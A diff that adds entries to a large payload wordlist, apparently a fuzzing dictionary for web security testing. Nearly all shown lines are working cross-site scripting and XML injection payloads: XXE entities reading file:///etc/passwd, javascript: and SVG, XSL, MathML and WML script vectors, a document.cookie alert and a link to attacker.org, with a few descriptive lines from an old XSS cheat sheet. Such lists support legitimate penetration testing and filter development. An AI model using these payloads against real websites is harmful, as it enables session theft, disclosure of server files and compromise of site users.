@@ -4962,6 +4962,7 @@ $~u4\\
 <?xml version="1.0" standalone="yes"?><!doctype ernw [ <!entity xxe system "file:///etc/passwd" > ]><svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-family="verdana" font-size="16" x="10" y="40">&xxe;</text></svg>
 <?xml version="1.0" standalone="yes"?><!doctype ernw [ <!entity xxe system "file:///etc/passwd" > ]><svg width="500px" height="40px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">&xxe;</svg>
 <?xml version="1.0"?><?xml-stylesheet type="text/xml" href="#stylesheet"?><!doctype doc [<!attlist xsl:stylesheet  id    id    #required>]><svg xmlns="http://www.w3.org/2000/svg">    <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/xsl/transform">        <xsl:template match="/">            <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(1)"></iframe>        </xsl:template>    </xsl:stylesheet>    <circle fill="red" r="40"></circle></svg>
+<?xml version="1.0"?><?xml-stylesheet type="text/xml" href="#stylesheet"?><!doctype doc [<!attlist xsl:stylesheet id id #required>]><svg xmlns="http://www.w3.org/2000/svg"> <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/xsl/transform"> <xsl:template match="/"> <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(1)"></iframe> </xsl:template> </xsl:stylesheet> <circle fill="red" r="40"></circle></svg>
 <?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="data:,%3cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/xsl/transform' id='xss'%3e%3cxsl:output method='html'/%3e%3cxsl:template match='/'%3e%3cscript%3ealert(1)%3c/script%3e%3c/xsl:template%3e%3c/xsl:transform%3e"?><root/>
 <?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="data:,%3cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/xsl/transform' id='xss'%3e%3cxsl:output method='html'/%3e%3cxsl:template match='/'%3e%3cscript%3ealert(66)%3c/script%3e%3c/xsl:template%3e%3c/xsl:transform%3e"?><root/>
 <?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>alert(document.cookie);</html:script></html:html>
@@ -5002,6 +5003,7 @@ $~u4\\
 <a class="headermenu-dropdown-link d-block no-underline position-relative py-2 link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;trending&quot;,&quot;context&quot;:&quot;open_source&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;trending_link_open_source_navbar&quot;}" href="https://github.com/trending">
 <a class="headermenu-link no-underline px-0 px-lg-2 py-3 py-lg-2 d-block d-lg-inline-block" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;pricing&quot;,&quot;context&quot;:&quot;global&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;pricing_link_global_navbar&quot;}" href="https://github.com/pricing">pricing</a>
 <a class=bar href="http://www.example.org">www.example.org</a>
+<a href="http://attacker.org"> <iframe src="http://example.org/"></iframe></a>
 <a href="http://attacker.org"><iframe src="http://example.org/"></iframe></a>
 <a href="http://google.com/">xss</a>
 <a href="http://google:ha.ckers.org">xss</a>
@@ -5081,6 +5083,7 @@ $~u4\\
 <a target=_blank href="https://vulnerabledoma.in/char_test?xss=0&body=<div onfocus=alert(1) style=writing-mode:rl-bt id=xss>#xss">writing-mode:rl-bt</a>
 <a target=_blank href="https://vulnerabledoma.in/char_test?xss=0&body=<div onfocus=alert(1) style=writing-mode:tb-lr id=xss>#xss">writing-mode:tb-lr</a>
 <a target=_blank href="https://vulnerabledoma.in/char_test?xss=0&body=<div onfocus=alert(1) style=writing-mode:tb-rl id=xss>#xss">writing-mode:tb-rl</a>
+<a x="javasc&#x0aript:alert(1)" style="\000062\00065\68\0\00 \&#xa0\000061 vio\r:url\28#default#time2);\-\\\00006d\0006f\7a\2d \62 \000069 \06e din\g:url(test.xbl#xss);\-\00006f\0002d\6c\69 \6e \00006b:attr(x);\-\00006f\0002d\6c\69 \6e \00006b-s\ource:current" end=0 onend=alert(1)>xxx
 <a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">
 <a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(87)"><rect width="1000" height="1000" fill="white"/></a>
 <a:script xmlns:a="http://www.w3.org/1999/xhtml">alert(2)</a:script>
@@ -5169,6 +5172,7 @@ $~u4\\
 <desc>using an embed tag you can embed a flash movie that contains xss. if you add the attributes allowscriptaccess=&quot;never&quot; and allownetworking=&quot;internal&quot; it can mitigate this risk (thank you to jonathan vanasco for the info). demo: http://ha.ckers.org/weird/xssflash.html :</desc>
 <desc>utf-7 encoding - if the page that the xss resides on doesn&apos;t provide a page charset header, or any browser that is set to utf-7 encoding can be exploited with the following (thanks to roman ivanov http://www.pixel-apes.com/ for this one). you don&apos;t need the charset statement if the user&apos;s browser is set to auto-detect and there is no overriding content-types on the page in internet explorer and netscape 8.1 ie rendering engine mode). watchfire  http://seclists.org/lists/fulldisclosure/2005/dec/1107.html found this hole in google&apos;s custom 404 script.</desc>
 <desc>xml data island with cdata obfuscation (this xss attack works only in ie and netscape 8.1 ie rendering engine mode) - vector found by sec consult http://www.sec-consult.html while auditing yahoo.</desc>
+<div draggable="true" ondragstart="event.datatransfer.setdata('text/plain','malicious code');"> <h1>drop me</h1></div><iframe src="http://www.example.org/drophere.html"></iframe>
 <div draggable="true" ondragstart="event.datatransfer.setdata('text/plain','malicious code');"><h1>drop me</h1></div><iframe src="http://www.example.org/drophere.html"></iframe>
 <div id="104"><svg xmlns="http://www.w3.org/2000/svg" id="foo">
 <div id="105"><iframe src="data:image/svg-xml,%1f%8b%08%00%00%00%00%00%02%03%b3)n.%ca%2c(q%a8%c8%cd%c9%2b%b6u%ca())%b0%d2%d7%2f%2f%2f%d7%2b7%d6%cb%2fj%d77%b4%b4%b4%d4%af%c8(%c9%cdq%b2k%cci-*%d10%d4%b4%d1%87%e8%b2%03"></iframe>//["'`-->]]>]</div><div id="106"><img src onerror /" '"= alt=alert(106)//">//["'`-->]]>]</div><div id="107"><title onpropertychange=alert(107)></title><title title=></title>//["'`-->]]>]</div>
@@ -5203,6 +5207,7 @@ $~u4\\
 <div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">x
 <div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">x</div>
 <div><embed src=\\
+<doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml"> <html:style /><x xlink:href="javascript:alert(1)" xlink:type="simple">xxx</x></doc>
 <doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml"><html:style /><x xlink:href="javascript:alert(68)" xlink:type="simple">xxx</x></doc>
 <embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
 <embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>?
@@ -5363,6 +5368,7 @@ $~u4\\
 <maction actiontype="statusline" xlink:href="javascript:alert(3)">clickme<mtext>http://http://google.com</mtext></maction>
 <maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">clickme</maction>
 <math href="javascript:alert(1)">clickme</math><math><!-- up to ff 13 --><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">clickme</maction><!-- ff 14+ --><maction actiontype="statusline" xlink:href="javascript:alert(3)">clickme<mtext>http://http://google.com</mtext></maction></math>
+<math href="javascript:alert(1)">clickme</math><math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">clickme</maction></math>
 <math href="javascript:alert(130)">clickme</math><math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">clickme</maction><maction actiontype="statusline" xlink:href="javascript:alert(3)">clickme<mtext>http://http://google.com</mtext></maction></math>
 <math href="javascript:javascript:alert(1)">clickme</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">clickme</maction> </math>
 <math href="javascript:javascript:alert(3956)">clickme</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(3956)">clickme</maction> </math>
@@ -5606,6 +5612,7 @@ $~u4\\
 <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><feimage><set attributename="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,phn2zyb4bwxucz0iahr0cdovl3d3dy53my5vcmcvmjawmc9zdmcipjxzy3jpchq%2bywxlcnqomsk8l3njcmlwdd48l3n2zz4ncg%3d%3d"/></feimage></svg>
 <svg xmlns="http://www.w3.org/2000/svg">
 <svg xmlns="http://www.w3.org/2000/svg"><a id="x"><rect fill="white" width="1000" height="1000"/></a><rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><a id="x"><rect fill="white" width="1000" height="1000"/></a><rect fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/></svg>
 <svg xmlns="http://www.w3.org/2000/svg"><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="1000" height="1000" fill="white"/></a></svg>
 <svg xmlns="http://www.w3.org/2000/svg"><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(87)"><rect width="1000" height="1000" fill="white"/></a></svg>
 <svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:\u0061lert(1);"></g></svg>
@@ -5659,6 +5666,7 @@ $~u4\\
 <x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>
 <x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(1)"><x:timer value="1"/></x:template>
 <x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(83)"><x:timer value="1"/></x:template>
+<x:template xmlns:x="http://www.wapforum.org/2001/wml" x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(1)"><x:timer value="1"/></x:template>
 <xml id=xss src="http://ha.ckers.org/xsstest.xml" id=i></xml>
 <xml src="http://ha.ckers.org/xsstest.xml" id=i></xml>
 <xml src="http://ha.ckers.org/xsstest.xml" id=i></xml><span datasrc=#i datafld=c dataformatas=html></span>
@@ -16853,6 +16861,7 @@ mf1\\73
 mf1\\801
 mf1\\81
 mgp9yqo1zxt]~fj_jjn\\x\\b;>2c,eg
+mhtml:http://html5sec.org/test.html!xss.htmlmhtml:http://html5sec.org/test.gif!xss.html
 mickeyd\\\'s
 micro_page.phphttp://dash.harvard.edu/robots.txt
 micro_page.phphttp://openhatch.org/robots.txt
